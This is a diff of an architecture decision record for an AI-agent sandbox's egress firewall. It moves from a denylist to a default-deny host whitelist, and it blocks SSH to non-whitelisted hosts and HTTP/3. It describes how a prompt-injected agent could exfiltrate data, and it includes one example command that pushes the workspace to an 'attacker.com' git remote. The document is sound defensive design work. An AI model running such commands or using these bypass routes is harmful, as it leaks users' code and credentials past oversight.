@@ -1,4 +1,4 @@
-# ADR-012: Network Egress Firewall (L7 TLS-MITM Proxy, Denylist-First)
+# ADR-012: Network Egress Firewall (L7 TLS-MITM Proxy, Default-Deny Host Whitelist)
 
 **Status:** Accepted
 **Date:** 2026-04-20
@@ -21,31 +21,33 @@ The architecture simplifies accordingly: one uniform MITM mode, no carve-outs.
 
 ## Decisions
 
-### D1: Denylist-first, curated, not user-editable
+### D1: Default-deny host whitelist with global-IOC denylist as floor
 
 **Firmness: FIRM**
 
-Ship a ~35-entry curated denylist of known exfiltration sinks (webhook receivers, OAST infra, paste services, anonymous file drops, tunnels, dynamic DNS, DoH resolvers). Default-allow everything else. Rules baked into the image at `/etc/rip-cage/egress-rules.yaml`; not user-editable without forking.
+**Evolved 2026-05-27 per [ADR-024](ADR-024-prompt-injection-threat-model.md).** The earlier denylist-first stance was forged before prompt-injection-driven exfil was admitted as a first-class threat (ADR-024 D1). Under the expanded threat model, denylist is structurally weak against exfil-to-novel-domain — an attacker registers any new domain in seconds and walks past a curated list. The peer agent-sandbox consensus (Anthropic devcontainer, OpenAI Codex sandbox, StepSecurity harden-runner, Cursor, Vercel Sandbox) is default-deny host whitelist; rip-cage's denylist was the outlier.
+
+**Current decision:** the proxy enforces a default-deny host whitelist. Allow-list entries live in `.rip-cage.yaml` `network.allowed_hosts` (additive-list per ADR-021 D2: global ∪ project union). The existing ~35-entry curated denylist of known exfil sinks moves to a **global IOC denylist** that the user's allowlist cannot override (harden-runner pattern: project allowlist can broaden but not shrink the IOC floor).
+
+**Observe-mode-first rollout (load-bearing for adoption):** new cages start in `network.mode: observe` — nothing is blocked, traffic is logged, baseline whitelist is pre-loaded (LLM provider APIs, github/gitlab hosts, top package registries, common doc sites). Promotion to `network.mode: block` via `rc allowlist promote --from-observed`. Existing cages (created before this evolution) have no `network.mode` set; runtime treats absence as pre-evolution legacy behavior — non-regression contract per ADR-021 D5. Audit-then-block is the only proven adoption path per peer survey; default-block on day one produces the "just turn it off" exit (violates CLAUDE.md "annoying is a design signal").
 
 **Rationale:**
 
-Matches DCG's philosophy: small, curated, on-by-default, no knobs. Allowlists require per-project config which most users will skip, defaulting to zero protection — the worst outcome for a safety tool. A denylist is immediately useful on first `rc up` without any configuration.
+Under ADR-024 D1's prompt-injection threat class, denylist's structural weakness (any new attacker domain bypasses) outweighs its first-run-friction advantage. Whitelist's "it's annoying" risk is solved by observe-mode rollout — the friction is opt-in (user promotes when ready), not default. The L7 MITM proxy infrastructure (D2) is preserved; only the policy expression changes.
 
-Not-user-editable is deliberate. A security tool with a user-editable block list becomes a user-editable *allow list* the moment an agent suggests edits, defeating the point. The "binary on/off" model via `RIP_CAGE_EGRESS=off` is the one escape valve — explicit and auditable. Same model as DCG's `--dangerously-skip-dcg`.
+The agent inside the cage **cannot** mutate `network.allowed_hosts` (the file is writable, but `rc reload` is host-only — see ADR-022 D6 pattern extended for `network.*` fields). The edit path requires a host-side agent, preserving the design intent that prompt-injected agents cannot self-grant.
 
 **Alternatives considered:**
 
 | Approach | Pros | Cons |
 |---|---|---|
-| **Curated denylist, baked** | • Zero-config, works immediately | • Won't catch novel channels until list updates |
-| | • Not weaponizable via prompt injection | • Responsibility on maintainers to curate |
-| | • Consistent philosophy with DCG | |
-| Per-project allowlist (`.rc-egress.yaml`) | • User controls exactly what's allowed | • Friction → most users skip → no protection |
-| | | • Config file writable by agent = bypass |
-| User-editable denylist | • Flexibility | • Agent edits list → bypass |
-| No firewall | • Zero work | • Known exploitable gap |
+| **Default-deny whitelist + observe-mode-first (this decision)** | Matches peer consensus; covers exfil-to-novel-domain; observe-mode solves adoption friction | More config surface; baseline list becomes a maintenance dependency |
+| Keep denylist-first (pre-evolution) | Zero-config; works immediately | `external:` rejected — under ADR-024 D1, denylist is paper-thin against injection-driven exfil; verified by 3-agent research round |
+| Whitelist with no audit mode | Tighter from day one | `direct:` rejected — "it's annoying" failure mode; peer evidence (Cursor users complaining about `fonts.googleapis.com`) |
+| GET-allow + POST-whitelist method-axis split | Preserves all reads; tight on writes | `external:` rejected after research — coding-agent exfil is plausibly 50/50 GET-vs-POST; GET still leaks via DNS / URL-query / allowlisted-API abuse |
+| Per-rule exemptions editable by user | Flexibility | Prompt-injection weaponizable — same reasoning as pre-evolution |
 
-**What would invalidate this:** Evidence that the curated list is either too restrictive (blocks legitimate dev workflows regularly) or too permissive (novel exfil channels appear faster than list updates). Revisit cadence: review quarterly.
+**What would invalidate this:** evidence that observe-mode-generated allowlists become unmanageably large (>~50 hosts typical) — would suggest host-axis is wrong-altitude and work-altitude is per-MCP or per-tool, not per-host.
 
 ### D2: L7 TLS-MITM proxy over L3/L4 iptables-only
 
@@ -185,21 +187,39 @@ Bind-mount path means the user sees denials from the host without entering the c
 
 **What would invalidate this:** A real incident where allowed-traffic forensics would have caught a confused-deputy exfil. Revisit then — easy to extend.
 
-### D8: Non-HTTP egress stays allowed — accepted risk
+### D8: Non-HTTP egress mostly allowed; TCP 22 to non-whitelisted hosts refused; HTTP/3 (UDP/443) blocked
 
-**Firmness: FIRM** (promoted 2026-04-23 from the "Open" section that previously held this question, resolving the ADR-013 D4 dependency. User-confirmed 2026-04-24: Option A "non-HTTP stays allowed" per the rip-cage philosophy — blast-radius reduction, not an L4 wall.)
+**Firmness: FIRM**
 
-The firewall intercepts TCP 80/443 only. Anything else — TCP 22 (git-over-ssh), 25 (smtp), arbitrary high ports, raw UDP — bypasses the proxy entirely and is not restricted by iptables. This is a deliberate, accepted risk, not a gap.
+**Evolved 2026-05-27 per [ADR-024](ADR-024-prompt-injection-threat-model.md).** The earlier "non-HTTP stays allowed... deliberate, accepted risk" stance was forged before prompt-injection-driven exfil was admitted as a first-class threat. Under ADR-024 D1, two specific non-HTTP egress channels are now load-bearing exfil paths that cannot stay open:
 
-**Rationale:** rip-cage's egress firewall applies the same 80/20 denylist approach at L4 that D1 applies at L7. The L7 denylist works because the asymmetry favors it: ~20 obvious exfil hosts (webhook.site, pastebin, transfer.sh, ngrok) can be blocked at zero cost to legitimate traffic. Non-HTTP has no such asymmetry — any port-based or host-based L4 denylist would be either cosmetic (real attackers use any port) or require real infrastructure (SNI sniffing, DNS filtering) for marginal protection above what the rest of the stack already provides.
+1. **TCP 22 (git-over-ssh):** an injection-affected agent with ssh-agent forwarding (ADR-017) can `git push` workspace contents to any host the user's keys reach. A prompt-injected agent doing `git remote add evil-mirror git@attacker.com:repo && git push evil-mirror` bypasses the HTTP egress entirely.
+2. **UDP/443 (HTTP/3 / QUIC):** TLS is integrated into QUIC transport; standard MITM TLS interception does not apply. Any L7 policy in D1 is bypassable via HTTP/3 unless UDP/443 is explicitly dropped.
 
-The cage is not a firewall product. DCG, the compound-command blocker, the filesystem sandbox, and push-less credential defaults are doing the containment work. The egress firewall's scope is "stop the agent from accidentally hitting a webhook it shouldn't" — a legitimate 80/20 goal that does not require L4 coverage.
+**Current decision:** the firewall intercepts TCP 80/443 (per D2) AND refuses TCP 22 connections to hosts NOT in `network.allowed_hosts` (per ADR-012 D1 evolved). UDP/443 outbound is dropped to force HTTP/2 fallback. Other non-HTTP traffic (TCP 25, arbitrary high ports, ICMP) remains unrestricted at the iptables layer — those are not load-bearing exfil channels under the realistic threat model.
 
-Legitimate non-HTTP needs (git-over-ssh, DNS, NTP, package registries on non-standard ports) remain unblocked. An agent that compiles its own tooling could exfil over raw TCP to any port/IP; DCG + compound blocker + filesystem sandbox make that unlikely but not impossible. That is the accepted residual risk, consistent with the project framing: layers, not walls.
+The ssh-agent-filter (ADR-022 D1 `ssh.allowed_keys` + D3 mechanism) continues to operate unchanged at the credential layer. It is a separate, complementary mechanism: ssh-agent-filter governs *which keys forward*; the iptables TCP-22 block governs *which destinations are reachable on port 22*. Both fire in sequence on a `git push`; the network-layer block fires first.
 
-**What would invalidate this:** a real incident where non-HTTP exfil was the vector, *and* the rest of the stack failed to contain it. Revisit then with a specific L4 posture proposal, not a blanket default-deny.
+**Rationale:**
 
-**Test assertion (ADR-013 P3):** positive iptables-rule check that no REDIRECT/DROP rule targets ports other than 80/443. Documents the policy in code.
+Under ADR-024 D1's threat model, the 80/20 cut shifts: the asymmetry that made "non-HTTP mostly allowed" defensible (legitimate traffic mostly on standard ports; attacker traffic mostly on the same ports) no longer holds for git-over-ssh, where the legitimate destination (github/gitlab) IS the attacker's likely cover. Adding TCP 22 to the destination-whitelist closes the load-bearing channel without breaking legitimate git workflows (the whitelist covers github/gitlab/etc. by default).
+
+HTTP/3 block is mechanical: any policy that doesn't address QUIC is bypassable by every modern HTTP client. Per production-pattern research, "block UDP/443 outbound to force HTTP/2 fallback" is the standard cheap mitigation.
+
+Other non-HTTP (SMTP, arbitrary ports) remains out of scope. Same reasoning as the pre-evolution stance: rip-cage is not a firewall product; DCG + compound-blocker + container isolation + filesystem sandbox cover those vectors with sufficient defense-in-depth for the named threat model. An agent that compiles its own tooling to exfil over raw TCP to a high port is still the accepted residual risk.
+
+**Alternatives considered:**
+
+| Approach | Pros | Cons |
+|---|---|---|
+| **TCP 22 in whitelist + UDP/443 blocked + other non-HTTP unrestricted (this decision)** | Closes the two load-bearing channels under ADR-024 D1 without blanket-banning non-HTTP | More iptables surface to maintain |
+| Keep pre-evolution stance (non-HTTP all allowed) | Simplest | `external:` rejected — git-push exfil via ssh-agent forwarding is a real channel under the new threat model; HTTP/3 routes around D1 |
+| Block ALL non-HTTP outbound | Tightest | `reasoned:` rejected — breaks legitimate non-HTTP needs (DNS, NTP, package registries on non-standard ports) with no proportional security gain |
+| Block TCP 22 entirely (no whitelist) | Simpler than scoped whitelist | `reasoned:` rejected — breaks `git push` for legitimate destinations; defeats ssh-agent forwarding (ADR-017) entirely |
+
+**What would invalidate this:** ssh-only hosts (e.g., self-hosted gitea with no HTTPS endpoint) become so common that the one-time `.rip-cage.yaml` add per host produces meaningful friction — would need to bifurcate `network.allowed_hosts` into transport-shaped sub-fields. Or: HTTP/3 fallback to HTTP/2 stops working reliably (currently no evidence) — would need QUIC-decrypt support or per-host UDP/443 carve-out.
+
+**Test assertion (ADR-013 P3, evolved):** positive iptables-rule check that the active rule set covers (a) TCP 80/443 redirect to proxy, (b) TCP 22 refuse for non-whitelisted hosts, (c) UDP/443 drop. Documents the evolved policy in code.
 
 ## Related
 
